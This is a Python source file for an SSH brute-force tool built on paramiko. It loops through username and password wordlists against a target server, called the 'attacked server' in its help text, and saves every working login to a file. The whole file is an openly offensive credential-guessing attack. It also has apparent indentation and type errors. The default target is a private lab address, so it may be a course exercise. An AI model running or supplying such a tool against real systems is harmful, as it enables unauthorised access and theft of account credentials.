import paramiko
import sys
import os
import argparse
import pprint
from itertools import islice
import warnings

if not sys.warnoptions:
    warnings.simplefilter("ignore")

###global IP = 10.0.2.6
ip = '10.0.2.6'
port = 22
outputFile = os.getcwd()+"/txtSources/usersPassword.txt"
global namesCount
global passwordCount
#conection(ip, port, user, passwrd)


def conection(ip, port, username, passwrd):
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())    
    # try to connect to ssh server
    try:
        ssh.connect(ip , port, username, passwrd)
    # when is not successful close and return false
    except paramiko.AuthenticationException:
        ssh.close()
        return False
    # if connection successful return true
    else:
        ssh.close()
        return True

# read name on specific line
def readNameFile(filePath):
	# to ensure is counted as global and not local
	global namesCount
	with open(filePath) as lines:
	    # reading on specific line islice(file, from , where end) 
            name = [x.rstrip('\n') for x in islice(lines, namesCount,namesCount+1)]
	    # increase global to read next name after call this function again
            namesCount += 1
	    # return string and not array
	    return name[0]

# to read a password at specific line
def readPasswFile(filePath):
	# to ensure is counted as global and not local
	global passwordCount
	with open(filePath) as lines:
	    # reading on specific line islice(file, from , where end) 
            passw = [x.rstrip('\n') for x in islice(lines, passwordCount,passwordCount+1)]
	    # increase global to read next name after call this function again
            passwordCount += 1
	    # return string and not array
	    return passw[0]

# save user name and password in to the file
def saveToFile(name, passw, filePath):
	f = open(filePath, "a+")
	f.write(name + " " + passw + "\n")
	f.close()

# return number of lines in file
def file_len(fname):
    i=0
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

# arguments for this python script
parser = argparse.ArgumentParser()
# add arg for file with user name
parser.add_argument("-nf", "-nF", "--nameFile", help = " !! OBLIGATORY !! file with user name")
# only one user name
parser.add_argument("-un", "-uN", "--userName", help = "!! use if you have only one user !! user name not file")
# output file with cracked password
parser.add_argument("-of", "-oF", "--outputFile", help = "file for output not demanding")
# ip adress of ssh server
parser.add_argument("-ip", "--ipAdress", help = " !! OBLIGATORY !! ip adress of attacked server")
# port
parser.add_argument("-p", "--port", help = "port of attacked ssh default is 22")
# file with passwords
parser.add_argument("-pf", "-pF", "--passwordFile", help = "!! OBLIGATORY !! file with passwords")
args = parser.parse_args()

# if all arguments is typed for file which include users to try on differnt port and save to own file
if args.nameFile and args.passwordFile and args.ipAdress and args.port and args.outputFile:
	# set global variable for user to zero 
	namesCount=0
	# get numbers of line for user and password file
	countOfName=file_len(os.getcwd()+"/"+args.nameFile)
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# iterate over every user
	while (namesCount<countOfName):
		# set global variable for password to zero
		passwordCount=0
		# used for user to know how many password was iterated over
		help=0
		# get user from file
		user = readNameFile(os.getcwd()+"/"+args.nameFile)
		print("trying find password for user: " + user)
		# iterate over passwords
		while(passwordCount<countOfPassw):
			# get password from file
			passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
			# if user was connected save credintial to default file
        		if(conection(args.ipAdress, int(args.port), user, passw)==True):
				saveToFile(user, passw, os.getcwd()+"/"+args.outputFile)
				break
			help+=1
			# for user to know program is not stack
			if(help%50 == 0):
				print("nothing found in " + help + " try")
			# when user password not contain in file inform user
			elif(help == countOfPassw):
				print("password for " + user + " isn't in the file")

# all arguments for one specific user to try on differnt port and save to own file
elif args.userName and args.passwordFile and args.ipAdress and args.port and args.outputFile:
	# get numbers of line for user and password file
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# set global variable for password to zero
	passwordCount=0
	# used for user to know how many password was iterated over
	help=0
	print("trying find password for user: " + args.userName)
	# iterate over passwords
	while(passwordCount<countOfPassw):
		# get password from file
		passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
		# if user was connected save credintial to default file
        	if(conection(args.ipAdress, int(args.port) , args.userName, passw)==True):
			saveToFile(args.userName, passw, os.getcwd()+"/"+args.outputFile)
			break
		help+=1
		# for user to know program is not stack
		if(help%50 == 0):
			print("nothing found in " + help + " try")
		# when user password not contain in file inform user
		elif(help == countOfPassw):
			print("password for " + args.userName + " isn't in the file")

# to connect for different port with multiple users
elif args.nameFile and args.passwordFile and args.ipAdress and args.port:
	# set global variable for user to zero 
	namesCount=0
	# get numbers of line for user and password file
	countOfName=file_len(os.getcwd()+"/"+args.nameFile)
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# iterate over every user
	while (namesCount<countOfName):
		# set global variable for password to zero
		passwordCount=0
		# used for user to know how many password was iterated over
		help=0
		# get user from file
		user = readNameFile(os.getcwd()+"/"+args.nameFile)
		print("trying find password for user: " + user)
		# iterate over passwords
		while(passwordCount<countOfPassw):
			# get password from file
			passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
			# if user was connected save credintial to default file
        		if(conection(args.ipAdress, int(args.port), user, passw)==True):
				saveToFile(user, passw, outputFile)
				break
			help+=1
			# for user to know program is not stack
			if(help%50 == 0):
				print("nothing found in " + help + " try")
			# when user password not contain in file inform user
			elif(help == countOfPassw):
				print("password for " + user + " isn't in the file")

# to connect to specific port with one user
elif args.userName and args.passwordFile and args.ipAdress and args.port:	
	# get numbers of line for user and password file
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# set global variable for password to zero
	passwordCount=0
	# used for user to know how many password was iterated over
	help=0
	print("trying find password for user: " + args.userName)
	# iterate over passwords
	while(passwordCount<countOfPassw):
		# get password from file
		passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
		# if user was connected save credintial to default file
        	if(conection(args.ipAdress, int(args.port), args.userName, passw)==True):
			saveToFile(args.userName, passw, outputFile)
			break
		help+=1
		# for user to know program is not stack
		if(help%50 == 0):
			print("nothing found in " + help + " try")
		# when user password not contain in file inform user
		elif(help == countOfPassw):
			print("password for " + args.userName + " isn't in the file")

# to safe all user which were discovered password to own file
elif args.nameFile and args.passwordFile and args.ipAdress and args.outputFile:
	# set global variable for user to zero 
	namesCount=0
	# get numbers of line for user and password file
	countOfName=file_len(os.getcwd()+"/"+args.nameFile)
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# iterate over every user
	while (namesCount<countOfName):
		# set global variable for password to zero
		passwordCount=0
		# used for user to know how many password was iterated over
		help=0
		# get user from file
		user = readNameFile(os.getcwd()+"/"+args.nameFile)
		print("trying find password for user: " + user)
		# iterate over passwords
		while(passwordCount<countOfPassw):
			# get password from file
			passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
			# if user was connected save credintial to default file
        		if(conection(args.ipAdress, port, user, passw)==True):
				saveToFile(user, passw, os.getcwd()+"/"+args.outputFile)
				break
			help+=1
			# for user to know program is not stack
			if(help%50 == 0):
				print("nothing found in " + help + " try")
			# when user password not contain in file inform user
			elif(help == countOfPassw):
				print("password for " + user + " isn't in the file")

# to safe user which was discovered password to own file
elif args.userName and args.passwordFile and args.ipAdress and args.outputFile:	
	# get numbers of line for user and password file
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# set global variable for password to zero
	passwordCount=0
	# used for user to know how many password was iterated over
	help=0
	print("trying find password for user: " + args.userName)
	# iterate over passwords
	while(passwordCount<countOfPassw):
		# get password from file
		passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
		# if user was connected save credintial to default file
        	if(conection(args.ipAdress, port, args.userName, passw)==True):
			saveToFile(args.userName, passw, os.getcwd()+"/"+args.outputFile)
			break
		help+=1
		# for user to know program is not stack
		if(help%50 == 0):
			print("nothing found in " + help + " try")
		# when user password not contain in file inform user
		elif(help == countOfPassw):
			print("password for " + args.userName + " isn't in the file")

# use file of users to try
elif args.nameFile and args.passwordFile and args.ipAdress:
	# set global variable for user to zero 
	namesCount=0
	# get numbers of line for user and password file
	countOfName=file_len(os.getcwd()+"/"+args.nameFile)
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# iterate over every user
	while (namesCount<countOfName):
		# set global variable for password to zero
		passwordCount=0
		# used for user to know how many password was iterated over
		help=0
		# get user from file
		user = readNameFile(os.getcwd()+"/"+args.nameFile)
		print("trying find password for user: " + user)
		# iterate over passwords
		while(passwordCount<countOfPassw):
			# get password from file
			passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
			# if user was connected save credintial to default file
        		if(conection(args.ipAdress, port, user, passw)==True):
				saveToFile(user, passw, outputFile)
				break
			help+=1
			# for user to know program is not stack
			if(help%50 == 0):
				print("nothing found in " + help + " try")
			# when user password not contain in file inform user
			elif(help == countOfPassw):
				print("password for " + user + " isn't in the file")

# try passwords on one user
elif args.userName and args.passwordFile and args.ipAdress:	
	# get numbers of line for user and password file
	countOfPassw=file_len(os.getcwd()+"/"+args.passwordFile)
	# set global variable for password to zero
	passwordCount=0
	# used for user to know how many password was iterated over
	help=0
	print("trying find password for user: " + args.userName)
	# iterate over passwords
	while(passwordCount<countOfPassw):
		# get password from file
		passw = readPasswFile(os.getcwd()+"/"+args.passwordFile)
		# if user was connected save credintial to default file
        	if(conection(args.ipAdress, port, args.userName, passw)==True):
			saveToFile(args.userName, passw, outputFile)
			break
		help+=1
		# for user to know program is not stack
		if(help%50 == 0):
			print("nothing found in " + help + " try")
		# when user password not contain in file inform user
		elif(help == countOfPassw):
			print("password for " + args.userName + " isn't in the file")

# when not using obligatory arguments or something this show help
else:
	print("check if you use all obligatory arguments")
        parser.print_help()

